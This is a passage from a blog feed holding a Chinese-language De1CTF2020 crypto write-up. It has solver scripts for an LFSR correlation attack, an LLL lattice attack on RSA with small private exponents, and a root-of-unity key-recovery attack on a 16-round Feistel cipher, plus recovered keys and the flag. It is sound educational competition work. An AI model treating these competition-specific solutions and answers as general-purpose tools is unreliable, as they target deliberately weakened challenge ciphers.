      <title>WriteUp(De1CTF2020) - Crypto</title>
      <link href="/2020/05/04/WriteUp-De1CTF2020-Crypto/"/>
      <url>/2020/05/04/WriteUp-De1CTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="nlfsr">NLFSR</h3><h4 id="题解分析">[题解分析]</h4><p>分析源码发现是四个LFSR组合成的加密系统，相关系数分析如下：</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-21.png"></p><p>发现第一个LFSR相关系数0.75，相关攻击即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        single_cipher = single_lfsr(a, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print(<span class="string">"a is &#123;&#125;"</span>.format(a))</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>得到 a = 363445</p><p>因为<span class="math inline">\(x_{2}=0\)</span>时，<span class="math inline">\(value=x_3\oplus x_4\)</span>；<span class="math inline">\(x_2=1\)</span>时，<span class="math inline">\(value=x_1\)</span>，所以第一个LFSR流与最终流不一致的比特位上，第二个LFSR流一定为0</p><p>取第一个LFSR流与最终流不一致的至少19个比特位，即可恢复b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">single_cipher_a = single_lfsr(a, ma, partMask, len(cipher))</span><br><span class="line"></span><br><span class="line">b0_pos = [] <span class="comment">#b==0的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2048</span>):</span><br><span class="line">    <span class="keyword">if</span> cipher[i] != single_cipher_a[i]:</span><br><span class="line">        b0_pos.append(i)</span><br><span class="line">b0_pos = b0_pos[:<span class="number">19</span>]</span><br><span class="line">        </span><br><span class="line">mb = <span class="number">0x40f3f</span></span><br><span class="line"></span><br><span class="line">mb_feedback = []</span><br><span class="line">mb_bin = bin(mb)[<span class="number">2</span>:].rjust(<span class="number">24</span>, <span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">if</span> mb_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        mb_feedback.append(i)</span><br><span class="line">mb_feedback.append(<span class="number">24</span>)</span><br><span class="line">mb_feedback = [_ - <span class="number">5</span> <span class="keyword">for</span> _ <span class="keyword">in</span> mb_feedback]</span><br><span class="line"><span class="comment"># mb_feedback = [0, 7, 8, 9, 10, 13, 14, 15, 16, 17, 18]</span></span><br><span class="line"></span><br><span class="line">cur = []</span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    v[i] = <span class="number">1</span></span><br><span class="line">    cur.append(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    cur19 = cur[<span class="number">-19</span>:]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mb_feedback:</span><br><span class="line">        v += cur19[j]</span><br><span class="line">    cur.append(v)</span><br><span class="line">    </span><br><span class="line">cur = cur[<span class="number">19</span>:]</span><br><span class="line"></span><br><span class="line">left = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b0_pos:</span><br><span class="line">    left.append(list(cur[i]))</span><br><span class="line">A = Matrix(F2, left)</span><br><span class="line"></span><br><span class="line">A.right_kernel()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-15.png"></p><p>于是得到 b = 0b1111000110101010110 = 494934</p><p>最后两个LFSR组成的密钥空间<span class="math inline">\(2^{19}\)</span>，直接爆破即可</p><p>得到 c = 4406，d = 63</p><h3 id="easyrsa">easyRSA</h3><h4 id="题解分析-1">[题解分析]</h4><p>给出<span class="math inline">\(e_{1},e_{2}\)</span>，对应的私钥满足</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">d = gmpy2.next_prime(r)</span><br></pre></td></tr></table></figure><p>2048 bits N下的这个上界(731 bits)显然不满足Wiener和Boneh Durfee，因此采用这篇<a href="howgrave-graham1999.pdf">paper</a>下的攻击方法：</p><p><span class="math inline">\(g=gcd(p-1,q-1),\lambda(n)=\frac{\varphi(n)}{g},s=1-p-q\)</span></p><p>且有<span class="math inline">\(ed-k\lambda(n)=1\)</span>，得到<span class="math inline">\(edg-kn=g+ks\quad (1)\)</span></p><p>设<span class="math inline">\(e_{1}\)</span>对应<span class="math inline">\(k_{1}\)</span>，<span class="math inline">\(e_{2}\)</span>对应<span class="math inline">\(k_{2}\)</span>，则有<span class="math inline">\(k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\quad (2)\)</span></p><p>由(1)(2)有： <span class="math display">\[\left\{\begin{matrix}e_{1}d_{1}g-k_{1}n=g+k_{1}s\\k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s)\end{matrix}\right.\]</span> 上述等式组也可表示为 <span class="math display">\[[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\cdot\left[\begin{matrix}n &amp; -M_{1}n &amp; 0 &amp; n^{2}\\0 &amp; M_{1}e_{1} &amp; M_{2}e_{1} &amp; -e_{1}n\\0 &amp; 0 &amp; -M_{2}e_{2} &amp; -e_{2}n\\0 &amp; 0 &amp; 0 &amp; e_{1}e_{2}\end{matrix}\right]\\=[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})，(g+k_{1}s)(g+k_{2}s)]\]</span> (其中<span class="math inline">\(M_{1}=n^{1/2},M_{2}=n^{1+\alpha_{2}},d\approx n^{\alpha_{2}}\)</span>.)</p><p>对部分参数进行上界估计，k上界近似于<span class="math inline">\(d\approx N^{\alpha_{2}}\)</span>，<span class="math inline">\(|s|\)</span>上界<span class="math inline">\(\approx N^{1/2}\)</span>，g一般相对极小</p><p>因此上面的矩阵表示BA=C中，C的每个元的size都近似<span class="math inline">\(n^{1+2\alpha_{2}}\)</span>，所以<span class="math inline">\(\|C\|\approx 2\cdot n^{1+2\alpha_{2}}\)</span></p><p>B作为格基的格中，最短向量由Minkowski Bounds知<span class="math inline">\(\approx \sqrt{4}det(B)^{1/4}\approx 2\cdot n^{(13/2+\alpha_{2})/4}\)</span></p><p>因此只要满足<span class="math inline">\(n^{1+2\alpha_{2}}&lt;n^{(13/2+\alpha_{2})/4}\)</span>即可将问题转化为SVP（<span class="math inline">\(\alpha_{2}&lt;\frac{5}{14}\)</span>）.</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">731</span>, <span class="number">682</span>, <span class="number">-1</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    alpha2 = i / <span class="number">2048</span></span><br><span class="line">    M1 = round(n ^ <span class="number">0.5</span>)</span><br><span class="line">    M2 = round(n ^ (<span class="number">1</span> + alpha2))</span><br><span class="line">    A = Matrix(ZZ, [</span><br><span class="line">        [n, -M1*n,      <span class="number">0</span>,   n^<span class="number">2</span>],</span><br><span class="line">        [<span class="number">0</span>, M1*e1, -M2*e1, -e1*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,  M2*e2, -e2*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,      <span class="number">0</span>, e1*e2]</span><br><span class="line">    ])</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    C = Matrix(ZZ, AL[<span class="number">0</span>])</span><br><span class="line">    B = A.solve_left(C)[<span class="number">0</span>]</span><br><span class="line">    phi1 = floor(e1 * B[<span class="number">1</span>] / B[<span class="number">0</span>])</span><br><span class="line">    phi2 = floor(e2 * B[<span class="number">2</span>] / B[<span class="number">0</span>])</span><br><span class="line">    d1 = inverse(e1, phi1)</span><br><span class="line">    d2 = inverse(e2, phi2)</span><br><span class="line">    m1 = long_to_bytes(pow(c, d1, n))</span><br><span class="line">    m2 = long_to_bytes(pow(c, d2, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m1 <span class="keyword">or</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m2:</span><br><span class="line">        print(m1)</span><br><span class="line">        print(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-06_01-20-35.png"></p><p>可以发现727 bits的时候LLL求解SVP成功</p><h4 id="more">[More]</h4><p>Day1晚上coin和我说是d3原题...只不过是size(d)只有一个范围，<span class="math inline">\(\alpha_{2}\)</span>要进行调整（原理理解起来不难...还是做题太少- -</p><h3 id="ecdh">ECDH</h3><p>没看-.-shallow师傅自己一个人a掉了tql</p><p>（题解分析视时间补充</p><h3 id="mini-purε-plus">Mini Purε Plus</h3><h4 id="题解分析-2">[题解分析]</h4><p>De1CTF2019也出过Purε，但那时候考察的是最基本的插值攻击，加密的轮次也只有6轮，今年ROUND提升到16后，直接排除一般的插值攻击</p><p>由题目分析知，给出pt的左半边均固定，所以输入形式为<span class="math inline">\((C, x),C\in GF(2^{24})\)</span>，查阅资料找到以下算法：</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/QQ图片20200506013028.jpg"></p><p>但实现以后发现计算<span class="math inline">\(3^{15}+1\)</span>个(x, y)的拉格朗日插值多项式时间复杂度接近<span class="math inline">\(O(2^{48})\)</span></p><p>晚上又在上面的算法基础上，加了中间相遇的优化，将问题转化为n元1次方程组的求解，时间复杂度上可行，但<span class="math inline">\(n\approx 40000\)</span>，内存消耗直接飙到2T，难顶</p><p><strong>[赛后复现]</strong></p><p>De1ta官方wp用的做法是高次积分攻击，原理分析起来也不难，但这里用的是rank1队伍用的另一种解法（借助<span class="math inline">\(GF(2^{24})\)</span>上的单位根）</p><p>他们一开始用的也是中间相遇攻击，即用<span class="math inline">\(g(x)\)</span>和<span class="math inline">\(h(y,z)\)</span>作为purε正向和逆向的函数表示</p><p>对于第i轮的输出左侧，<span class="math inline">\(deg_{x}(g)=3^{i-1}\)</span>，对于右侧，<span class="math inline">\(deg_{x}(g)=3^{i}\)</span>；</p><p>逆向来看，对于左侧，<span class="math inline">\(deg_{y}(h)=3^{16-m},deg_{z}(h)=3^{15-m}\)</span>，右侧，<span class="math inline">\(deg_{y}(h)=3^{15-m},deg_{z}(h)=3^{14-m}\)</span>.</p><p>但如果直接中间相遇攻击求解多项式的系数，就会遇到先前我说的空间复杂度凉凉</p><p>所以他们丢弃了<span class="math inline">\(h(y,z)\)</span>，改用<span class="math inline">\(g(x)\)</span>和单位根进行求解，具体如下：</p><p><span class="math inline">\(GF(2^{24})^{*}\)</span>上，基于阶为<span class="math inline">\(2^{24}-1\)</span>的事实，任意d次单位根<span class="math inline">\(\omega\)</span>都可表示为<span class="math inline">\(g^{\frac{2^{24}-1}{d}}\)</span>（g为<span class="math inline">\(GF(2^{24})\)</span>上的生成元）</p><p>且<span class="math inline">\(1+\omega+\omega^{2}+...+\omega^{d-1}=0\)</span>，易知<span class="math inline">\(\sum_{i=0}^{d-1}\omega^{ij}=0\)</span>在<span class="math inline">\(d\nmid j\)</span>时均成立，反之≠0（画个单位圆差不多就get了</p><p>所以随机取<span class="math inline">\(a\in GF(2^{24})\)</span>，在<span class="math inline">\(deg(g)&lt;d\)</span>时，均有 <span class="math display">\[\sum^{d-1}_{i=0}g(a\omega^{i})=g(0)\]</span> 设第i轮后的密文为<span class="math inline">\((l_{i},r_{i})\)</span>，则第i-1轮后的密文为<span class="math inline">\((r_{i}+(l_{i}+k_{i})^{3},l_{i})=((r_{i}+l_{i}^{3})+l_{i}^{2}k_{i}+l_{i}k_{i}^{2}+k_{i}^{3},l_{i})\)</span></p><p>可以看到第i-1轮左侧<span class="math inline">\(k_{i}\)</span>的依赖项为<span class="math inline">\(l_{i}^{2},l_{i}\)</span>，再基于前面提到的第i轮时，左侧<span class="math inline">\(deg_{x}(g)=3^{i-1}\)</span>，如果<span class="math inline">\(l_{i}\)</span>的<span class="math inline">\(degree&lt;d\)</span>，则<span class="math inline">\(g(0)+\sum l_{i}=0\)</span>，且<span class="math inline">\(k_{i}^{3}\)</span>的系数1一定累加偶数次（因为<span class="math inline">\(d\mid (2^{24}-1)\Rightarrow 2\nmid d\)</span>），即累加后三次项的系数一定为0，这样就会导致所有<span class="math inline">\(k_{i}\)</span>的依赖项等于0，求解失败</p><p>于是令<span class="math inline">\(3^{i-1}&gt;d,3^{i-2}&lt;d,d\mid (2^{24}-1)\)</span>，比如求解k15时，取<span class="math inline">\(d=\frac{2^{24}-1}{3}\)</span>，求解k14时，<span class="math inline">\(d//=3\)</span>，问题转化为向量相加并求解二次方程根，时间复杂度控制在<span class="math inline">\(O(2^{24})\)</span>下</p><p>求解出k14,k15后，根据题目中最后给出的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = sympy.nextprime(<span class="number">2</span>**<span class="number">24</span>)</span><br><span class="line">arr = np.random.randint(<span class="number">0</span>,p,(ROUND,ROUND<span class="number">-2</span>),dtype=<span class="string">'int64'</span>)</span><br><span class="line">keys = np.array(keys)</span><br><span class="line">res = np.mod(np.dot(keys,arr),p)</span><br></pre></td></tr></table></figure><p>问题即转化为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br><span class="line">K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br></pre></td></tr></table></figure><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">toF = F.fetch_int</span><br><span class="line">fromF = <span class="keyword">lambda</span> i : i.integer_representation()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get data</span></span><br><span class="line">data = dict()</span><br><span class="line"><span class="keyword">for</span> pt, ct <span class="keyword">in</span> zip(open(<span class="string">'pt.txt'</span>), open(<span class="string">'ct.txt'</span>)):</span><br><span class="line">    pt = pt.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ptr = toF(int(pt[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    ct = ct.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ctl = toF(int(ct[:<span class="number">6</span>], <span class="number">16</span>))</span><br><span class="line">    ctr = toF(int(ct[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    data[ptr] = (ctl, ctr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">omega = F.gen()^<span class="number">3</span> <span class="comment"># ((2^24-1)/3)th root of unity</span></span><br><span class="line">poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_15</span></span><br><span class="line">a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">3</span>)):</span><br><span class="line">    r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">    v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    poly += v</span><br><span class="line">    a *= omega</span><br><span class="line">r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><pre><code>100%|██████████| 5592405/5592405 [04:04&lt;00:00, 22915.12it/s]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R = PolynomialRing(F, names=<span class="string">'k'</span>)</span><br><span class="line">k = R.gen()</span><br><span class="line">eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">k15s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">print([fromF(_) <span class="keyword">for</span> _ <span class="keyword">in</span> k15s])</span><br></pre></td></tr></table></figure><pre><code>[4122190, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">k1415 = []</span><br><span class="line"><span class="keyword">for</span> k15 <span class="keyword">in</span> k15s:</span><br><span class="line">    omega = F.gen()^<span class="number">9</span> <span class="comment"># ((2^24-1)/9)th root of unity</span></span><br><span class="line">    poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_14</span></span><br><span class="line">    a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">9</span>)):</span><br><span class="line">        r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">        l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">        v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">        poly += v</span><br><span class="line">        a *= omega</span><br><span class="line">    r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">    l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">    poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">    k14s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">    <span class="keyword">for</span> k14 <span class="keyword">in</span> k14s:</span><br><span class="line">        k1415.append((fromF(k14), fromF(k15)))</span><br><span class="line">        print((fromF(k14), fromF(k15)))</span><br></pre></td></tr></table></figure><pre><code>100%|██████████| 1864135/1864135 [01:27&lt;00:00, 21343.81it/s]  0%|          | 2069/1864135 [00:00&lt;01:30, 20685.68it/s](2216205, 4122190)(14035807, 4122190)100%|██████████| 1864135/1864135 [01:26&lt;00:00, 21605.20it/s](5546654, 14944194)(9208218, 14944194)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">arr = re.findall(<span class="string">r"\d+"</span>, open(<span class="string">"data.txt"</span>, <span class="string">"r"</span>).read())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ks = []</span><br><span class="line"><span class="keyword">for</span> k14, k15 <span class="keyword">in</span> k1415:</span><br><span class="line">    K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br><span class="line">    Ks.append(K.list() + [k14, k15])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Ks:</span><br><span class="line">    l = toF(<span class="number">0x777777</span>)</span><br><span class="line">    r = toF(<span class="number">2333</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l , r = r , l + (r + toF(int(k[i]))) ^ <span class="number">3</span></span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">if</span> (l, r) == data[toF(<span class="number">2333</span>)]:</span><br><span class="line">        key = k</span><br><span class="line">        print(key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><pre><code>[16359893, 9091260, 11254674, 353718, 5395716, 9319892, 2360013, 12784246, 9857353, 2940944, 964650, 3296014, 7022345, 198188, 9208218, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'d519b93b0fd950bdf1e1c321fc32e4c4c4b225b80c1ba091f31217b90132ed107e1f6b1c9dd60ba0eafcdd5923764c46'</span></span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">12</span>):</span><br><span class="line">    r, l = toF(int(cipher[i:i+<span class="number">6</span>], <span class="number">16</span>)), toF(int(cipher[i+<span class="number">6</span>:i+<span class="number">12</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l, r = r + (l + toF(int(key[<span class="number">15</span>-j]))) ^ <span class="number">3</span>, l</span><br><span class="line">    l, r = fromF(l), fromF(r)</span><br><span class="line">    flag += (long_to_bytes(l) + long_to_bytes(r))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><pre><code>b&#39;De1CTF{6a2ddcc3-c729-48f8-b5e0-7574c46a2846}\x04\x04\x04\x04&#39;</code></pre><h4 id="more-1">[More]</h4><p>比赛期间其实已经找到高次积分攻击相关的内容了- -但是他后面给了张表（15 ROUND要跑31h），直接劝退，看到官方wp的时候（一脸懵），然后再看了下表上的测试用cpu，奔腾4...👴佛辣</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-1</title>
      <link href="/2020/04/30/CTF-Training-Record-1/"/>
      <url>/2020/04/30/CTF-Training-Record-1/</url>
      
        <content type="html"><![CDATA[<h3 id="preface">Preface</h3><p>CTF-Training-Record系列仅用于作部分CTF刷题记录，不定期更新</p><h3 id="de1ctf2019---babylfsr">De1CTF2019 - Babylfsr</h3><h4 id="题目考点">[题目考点]</h4><ul><li>BM algorithm</li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="Babylfsr.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(FLAG==<span class="string">"de1ctf&#123;"</span>+hashlib.sha256(hex(KEY)[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)).hexdigest()+<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(FLAG[<span class="number">7</span>:<span class="number">11</span>]==<span class="string">'1224'</span>)</span><br><span class="line"></span><br><span class="line">LENGTH = <span 